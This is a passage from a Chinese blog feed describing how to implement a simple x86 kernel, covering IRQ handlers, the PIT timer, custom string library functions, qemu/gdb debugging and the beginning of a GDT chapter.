<li><code>push 0</code>：对于某些中断（如除错、溢出等），<strong>CPU 会自动压入错误代码；对于不会自动压入错误代码的中断（如外部中断），为了统一处理流程，在这里手动压入一个占位的错误代码。</strong></li>
<li><code>push %2</code>：压入中断向量编号，供中断处理程序使用。</li>
<li><code>jmp irq_common_stub</code>：<strong>跳转到通用的中断处理代码。</strong></li>
</ul>
<blockquote>
<p>idt&#x2F;idt.c  构造irq相关的 描述符和 具体的irq函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	idt_set_gate(<span class="number">32</span>, (<span class="type">uint32_t</span>)irq0, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">33</span>, (<span class="type">uint32_t</span>)irq1, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">34</span>, (<span class="type">uint32_t</span>)irq2, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">35</span>, (<span class="type">uint32_t</span>)irq3, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">36</span>, (<span class="type">uint32_t</span>)irq4, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">37</span>, (<span class="type">uint32_t</span>)irq5, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">38</span>, (<span class="type">uint32_t</span>)irq6, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">39</span>, (<span class="type">uint32_t</span>)irq7, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">40</span>, (<span class="type">uint32_t</span>)irq8, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">41</span>, (<span class="type">uint32_t</span>)irq9, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">42</span>, (<span class="type">uint32_t</span>)irq10, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">43</span>, (<span class="type">uint32_t</span>)irq11, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">44</span>, (<span class="type">uint32_t</span>)irq12, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">45</span>, (<span class="type">uint32_t</span>)irq13, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">46</span>, (<span class="type">uint32_t</span>)irq14, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line">	idt_set_gate(<span class="number">47</span>, (<span class="type">uint32_t</span>)irq15, <span class="number">0x08</span>, <span class="number">0x8E</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// IRQ 处理函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">irq_handler</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 发送中断结束信号给 PICs</span></span><br><span class="line">	<span class="comment">// 按照我们的设置，从 32 号中断起为用户自定义中断</span></span><br><span class="line">	<span class="comment">// 因为单片的 Intel 8259A 芯片只能处理 8 级中断</span></span><br><span class="line">	<span class="comment">// 故大于等于 40 的中断号是由从片处理的</span></span><br><span class="line">	<span class="keyword">if</span> (regs-&gt;int_no &gt;= <span class="number">40</span>) &#123;</span><br><span class="line">		<span class="comment">// 发送重设信号给从片</span></span><br><span class="line">		outb(<span class="number">0xA0</span>, <span class="number">0x20</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 发送重设信号给主片</span></span><br><span class="line">	outb(<span class="number">0x20</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (interrupt_handlers[regs-&gt;int_no]) &#123;</span><br><span class="line">		interrupt_handlers[regs-&gt;int_no](regs);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>ISR 和 iRQ 的处理过程：</strong></p>
<ul>
<li>ISR的处理过程是 (isr0 - isr31) -&gt; isr_common_stub（相同的处理部分） -&gt; isr_handler -&gt; 具体的ISR处理函数。</li>
<li>IRQ的处理过程是 (irq0 - irq15) -&gt; irq_common_stub -&gt; irq_hanlder -&gt; 具体的IRQ处理函数。</li>
</ul>
<h2 id="8-2-时钟中断和产生处理"><a href="#8-2-时钟中断和产生处理" class="headerlink" title="8.2 时钟中断和产生处理"></a>8.2 时钟中断和产生处理</h2><p>配置8253&#x2F;8254 timer 芯片</p>
<blockquote>
<p>drivers&#x2F;timer.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_callback</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">uint32_t</span> tick = <span class="number">0</span>;</span><br><span class="line">	printk_color(rc_black, rc_red, <span class="string">&quot;Tick: %d\n&quot;</span>, tick++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_timer</span><span class="params">(<span class="type">uint32_t</span> frequency)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 注册时间相关的处理函数</span></span><br><span class="line">	register_interrupt_handler(IRQ0, timer_callback);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Intel 8253/8254 PIT芯片 I/O端口地址范围是40h~43h</span></span><br><span class="line">	<span class="comment">// 输入频率为 1193180，frequency 即每秒中断次数</span></span><br><span class="line">	<span class="type">uint32_t</span> divisor = <span class="number">1193180</span> / frequency;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// D7 D6 D5 D4 D3 D2 D1 D0</span></span><br><span class="line">	<span class="comment">// 0  0  1  1  0  1  1  0</span></span><br><span class="line">	<span class="comment">// 即就是 36 H</span></span><br><span class="line">	<span class="comment">// 设置 8253/8254 芯片工作在模式 3 下</span></span><br><span class="line">	outb(<span class="number">0x43</span>, <span class="number">0x36</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 拆分低字节和高字节</span></span><br><span class="line">	<span class="type">uint8_t</span> low = (<span class="type">uint8_t</span>)(divisor &amp; <span class="number">0xFF</span>);</span><br><span class="line">	<span class="type">uint8_t</span> hign = (<span class="type">uint8_t</span>)((divisor &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 分别写入低字节和高字节</span></span><br><span class="line">	outb(<span class="number">0x40</span>, low);</span><br><span class="line">	outb(<span class="number">0x40</span>, hign);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_callback</span><span class="params">(pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">uint32_t</span> tick = <span class="number">0</span>;</span><br><span class="line">	printk_color(rc_black, rc_red, <span class="string">&quot;Tick: %d\n&quot;</span>, tick++);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>回调函数</p>
<ul>
<li><p>tick 静态成员变量 用来记录中断发生的次数</p>
</li>
<li><p><strong><code>printk_color(rc_black, rc_red, &quot;Tick: %d\n&quot;, tick++);</code></strong>: 在屏幕上打印当前的tick数，并以红色字体显示。每调用一次这个函数，<code>tick</code> 的值就增加1。</p>
</li>
</ul>
</blockquote>
<blockquote>
<p>include&#x2F;timer.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_TIMER_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_TIMER_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="comment">// 定时器每秒钟触发中断的次数。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_timer</span><span class="params">(<span class="type">uint32_t</span> frequency)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> 	<span class="comment">// INCLUDE_TIMER_H_</span></span></span><br></pre></td></tr></table></figure>



<h2 id="修改入口函数-1"><a href="#修改入口函数-1" class="headerlink" title="修改入口函数"></a>修改入口函数</h2><blockquote>
<p>init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    init_timer(<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 触发中断</span></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>; <span class="comment">// </span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>asm volatile(&quot;sti&quot;)</code></strong>   通常在系统末尾调用</p>
<ul>
<li>在汇编语言中，<code>sti</code> 指令的作用是设置中断标志（Set Interrupt Flag）</li>
<li>在操作系统启动过程中，中断通常在执行初期阶段被禁用（通常使用 <code>cli</code> 指令，即 Clear Interrupt Flag），以避免在系统未完全配置好时响应中断，这可能导致不稳定或错误。</li>
<li>在系统的关键组件如GDT、IDT和定时器等被初始化和配置好之后，使用 <code>sti</code> 指令允许中断，是为了启动正常的中断处理，这对于系统的进一步功能如多任务处理、响应外部设备请求等是必要的。</li>
</ul>
<p><img src="/2024/05/10/x86-4-%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20240512205003803.png" alt="image-20240512205003803"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>基于x86架构的简单内核实现-2</title>
    <url>/2024/05/07/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-2/</url>
    <content><![CDATA[<h1 id="5-库函数-和-调试打印函数"><a href="#5-库函数-和-调试打印函数" class="headerlink" title="5.库函数 和 调试打印函数"></a>5.库函数 和 调试打印函数</h1><p>基础部分在前四章已经介绍完了。</p>
<h2 id="5-1-c语言字符串处理函数"><a href="#5-1-c语言字符串处理函数" class="headerlink" title="5.1 c语言字符串处理函数"></a>5.1 c语言字符串处理函数</h2><p>在内核中无法使用 处于用户态的c语言库函数  所以需要自己实现相关函数</p>
<blockquote>
<p>include&#x2F;string.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> INCLUDE_STRING_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INCLUDE_STRING_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;typers.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="comment">// 将 src 指向的内存区域的前 len 个字节复制到 dest 指向的内存区域。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">memcpy</span><span class="params">(<span class="type">uint8_t</span> *dest, <span class="type">const</span> <span class="type">uint8_t</span> *src, <span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 dest 指向的内存区域的前 len 个字节设置为 val 指定的值。</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">memset</span><span class="params">(<span class="type">void</span> *dest, <span class="type">uint8_t</span> val, <span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 dest 指向的内存区域的前 len 个字节清零（等同于调用 memset(dest, 0, len)）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bzero</span><span class="params">(<span class="type">void</span> *dest, <span class="type">uint32_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比较两个字符串 str1 和 str2。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span> *str2)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串 src（包括终止 null 字符）复制到 dest。</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将字符串 src 连接到字符串 dest 的末尾，覆盖 dest 最后的 null 终止符，并在最后添加一个新的 null 终止符。</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算字符串 src 的长度，不包括终止的 null 字符。</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// INCLUDE</span></span></span><br></pre></td></tr></table></figure>



<p>函数实现</p>
<blockquote>
<p>libs&#x2F;string.c </p>
<p>memcpy()  </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">memcpy</span><span class="params">(<span class="type">uint8_t</span> *dest, <span class="type">const</span> <span class="type">uint8_t</span> *src, <span class="type">uint32_t</span> len)</span>&#123;</span><br><span class="line">    <span class="comment">// 异常处理</span></span><br><span class="line">    <span class="keyword">if</span> (dest == <span class="literal">NULL</span> || src == <span class="literal">NULL</span> || len ==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(; len != <span class="number">0</span>; len--) &#123;</span><br><span class="line">        *dest++ = *src++;  <span class="comment">// ++ 优先级高于 * 先右边结合 d++ 然后再 *d  最后在++进行自增 指向下一个内存地址</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用内联函数 减少函数调用的开销</p>
<p><code>++ 优先级高于 * 先右边结合 d++ 然后再 *d  最后在++进行自增 指向下一个内存地址</code></p>
<ul>
<li>解引用 <code>dest</code> 当前指向的内存位置，用于读取或写入值。</li>
<li>将 <code>dest</code> 指针移动到下一个 <code>uint8_t</code> 类型的内存地址。</li>
</ul>
<blockquote>
<p>memset（）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">memset</span><span class="params">(<span class="type">void</span> *dest, <span class="type">uint8_t</span> val, <span class="type">uint32_t</span> len)</span> &#123;</span><br><span class="line">    <span class="comment">//if (dest == NULL || len == 0) return;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> *dst = (<span class="type">uint8_t</span> *) dest;  </span><br><span class="line">    <span class="keyword">for</span> (; len != <span class="number">0</span>; len--) &#123;</span><br><span class="line">        *dst++ = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><pre><code class="c">uint8_t *dst = (uint8_t *) dest;
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行代码中的类型转换是必要的，因为 `void*` 类型的指针是一个通用指针，无法直接进行算术运算。将 `void*` 转换为 `uint8_t*` 使得可以按字节操作内存（即每次操作一个字节）。</span><br><span class="line">  - `uint8_t` 是一个确保只操作一个字节大小的类型，适用于按字节设置内存值。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; bzero() 将 dest 指向的内存区域的前 len 个字节清零（等同于调用 memset(dest, 0, len)）</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">inline void bzero(void *dest, uint32_t len)&#123;</span><br><span class="line">    memset(dest, 0, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<blockquote>
<p>strcmp()</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span> *str2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (*str1 &amp;&amp; *str2 &amp;&amp; *str1 == *str2) &#123;</span><br><span class="line">        str1++;</span><br><span class="line">        str2++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *str1 - *str2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>*str1 &amp;&amp; *str2</code> 确保当前指针指向的字符串不是终止字符 \0</p>
<p><code>*str1 == *str2</code> 确保相等</p>
<p>返回值：<code>return *str1 - *str2;</code> 返回ASCII之差</p>
<ol>
<li>如果 <code>*str1 - *str2</code> 为零（即 <code>*str1 == *str2</code>），这意味着两个字符串相等或在某一点同步到了字符串的终止字符。</li>
<li>如果 <code>*str1 - *str2</code> 为正值，则 <code>str1</code> 在首个不同点处的字符在字典顺序中位于 <code>str2</code> 的对应字符之后。</li>
<li>如果 <code>*str1 - *str2</code> 为负值，则 <code>str1</code> 在首个不同点处的字符在字典顺序中位于 <code>str2</code> 的对应字符之前。</li>
</ol>
<blockquote>
<p>strcpy()</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *tmp = dest;</span><br><span class="line">	<span class="comment">// 当src 不为终止符的时候继续</span></span><br><span class="line">	<span class="keyword">while</span> (*src) &#123;</span><br><span class="line">	      *dest++ = *src++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	*dest = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 终止符</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>strcat()</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">char</span> *<span class="title function_">strcat</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *cp = dest;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (*cp) &#123;</span><br><span class="line">	      cp++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ((*cp++ = *src++))</span><br><span class="line">	      ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <code>cp++;</code> 找到字符串末尾 </p>
<p><code>*cp++ = *src++</code> 进行赋值</p>
<blockquote>
<p>strlen()</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *eos = src;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (*eos++)</span><br><span class="line">	      ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (eos - src - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>(eos - src - 1)</code> 因为地址是连续的，所以直接进行地址相减</p>
<h2 id="5-2-内核级打印函数-printk"><a href="#5-2-内核级打印函数-printk" class="headerlink" title="5.2 内核级打印函数 printk"></a>5.2 内核级打印函数 printk</h2><p>参照printf 函数：首先是一个待显示的字符 串，里面分别用%加相关字母的方式一一指明了后面的参数数量和类型。只要我们传递正确 的带有格式描述的字符串和相关参数，printf函数就能正确的打印出来结果。</p>
<h2 id="5-3-利用qemu-联合-gdb-进行c语言-源代码级别调试"><a href="#5-3-利用qemu-联合-gdb-进行c语言-源代码级别调试" class="headerlink" title="5.3 利用qemu 联合 gdb 进行c语言 源代码级别调试"></a>5.3 利用qemu 联合 gdb 进行c语言 源代码级别调试</h2><p><strong>通讯机制：</strong></p>
<blockquote>
<p><code>qemu -S -s -fda floppy.img -boot a</code></p>
</blockquote>
<ol>
<li>注意这里的qemu 要替换成 qemu-system-i386 </li>
<li>因为qemu和gdb运行的时候毕竟是两个进程，数据交换必然涉及到进 程间通信机制。</li>
<li>-fda floppy.img 和 -boot a 是指定启动的镜像，-s 这个参数指的 是启动时开启1234端口等待gdb连接（这个参数从字面上看比较隐晦），-S 是指是启动时 不自动开始运行，等待调试器的执行命令。</li>
</ol>
<p>启动gdb后执行下面命令： — <strong>后续直接封装在gdbinit这个文件中</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file hx_kernel</span><br><span class="line">target remote :1234</span><br><span class="line">break kern_entry</span><br><span class="line">c</span><br></pre></td></tr></table></figure>



<p><strong>执行命令</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make debug</span><br></pre></td></tr></table></figure>



<h2 id="5-4-打印函数调用的栈信息-—-multiboot"><a href="#5-4-打印函数调用的栈信息-—-multiboot" class="headerlink" title="5.4 打印函数调用的栈信息 — multiboot"></a>5.4 打印函数调用的栈信息 — multiboot</h2><img src="/2024/05/07/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-2/image-20240510170440547.png" alt="image-20240510170440547" style="zoom:67%;">

<p>在示意图中我们假设从start函数-&gt;kern_entry函数-&gt;console_clear函数的调用过 程，最终暂停在console_clear函数里面。我们可以清楚的看到，<strong>只要拿到此时的ebp寄存 器的值，就可以沿着这个调用链找到每一个调用的函数的返回地址</strong>，之前的问题就这样解 决了。需要注意的是C语言里对指针做算数运算时，改变的地址长度是和当前指针变量的类 型相关的。</p>
<h2 id="5-4-修改entry-c函数"><a href="#5-4-修改entry-c函数" class="headerlink" title="5.4 修改entry.c函数"></a>5.4 修改entry.c函数</h2><blockquote>
<p>entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    console_clear();</span><br><span class="line">	console_write_color(<span class="string">&quot;Hello, OS kernel!\n&quot;</span>, rc_black, rc_green);</span><br><span class="line">    panic(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果：</p>
<p><img src="/2024/05/07/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-2/image-20240510170638484.png" alt="image-20240510170638484"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>基于x86架构的简单内核实现-3-全局段描述符表</title>
    <url>/2024/05/10/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-3-%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="6-添加全局段描述符表"><a href="#6-添加全局段描述符表" class="headerlink" title="6.添加全局段描述符表"></a>6.添加全局段描述符表</h1><h2 id="6-1保护模式"><a href="#6-1保护模式" class="headerlink" title="6.1保护模式"></a>6.1保护模式</h2><p>保护模式需要对内存段的性质和允许的操作给出定义，以实 现对特定内存段的访问检测和数据保护</p>
<p>80386中原先的 AX，BX，CX，DX，SI，DI，SP，BP从16位扩展（Extend）到了32位，并改名EAX，EBX， ECX，EDX，ESI，EDI，ESP，EBP，<strong>E就是Extend</strong>的意思。</p>
<blockquote>
<p>8036<strong>保护模式下的分段</strong></p>
<p>8036 虽然采用分段的方式进行寻址，但是 只是分了一个段</p>
<p><strong>即段基址为0x00000000， 短长为0xFFFFFFFF（4GB）</strong></p>
</blockquote>
<p>32位的保护模式下，对一个内存段的描述需要8个字节 — 段描述符  （8字节 &#x3D; 64位）</p>
<blockquote>
<p>段描述符又分为：数据段描述符，指令段描述符和系统段描述符三种</p>
</blockquote>
<img src="/2024/05/10/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-3-%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8/image-20240510181329916.png" alt="image-20240510181329916" style="zoom:67%;">



<p>描述符表：在<strong>内存中</strong>存放在描述符的集合</p>
<blockquote>
<p>intel 直接设置了一个48位的全局描述符表寄存器（GDTR）来保存描述符表的信息</p>
</blockquote>
<img src="/2024/05/10/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0-3-%E5%85%A8%E5%B1%80%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8/image-20240510200652839.png" alt="image-20240510200652839" style="zoom:67%;">

<p>16位来表示表的长度，那么2的16次方就是65536字节，除以每一个描述符的8字 节，<strong>那么最多能创建8192个描述符</strong></p>
<blockquote>
<p><strong>现代操作系统不在使用分段，而是直接使用分页技术</strong></p>
<p>分页只是保护模式下的一种内存管理策略</p>
</blockquote>
<h2 id="6-2分段策略-gdt-h"><a href="#6-2分段策略-gdt-h" class="headerlink" title="6.2分段策略 - gdt.h"></a>6.2分段策略 - gdt.h</h2><p>GRUB 在载入内核时候的一些状态</p>
<blockquote>
<ol>
<li><p>CS 指向基地址为 0x00000000，限长为4G – 1的<strong>代码段描述符</strong>。 </p>
</li>
<li><p>DS，SS，ES，FS 和 GS 指向基地址为0x00000000，限长为4G–1的<strong>数据段描述符</strong>。</p>
</li>
</ol>
</blockquote>
<p>在内核中实现GDT 全局描述符表</p>
<blockquote>
<p>include&#x2F;gdt.h</p>
</blockquote>
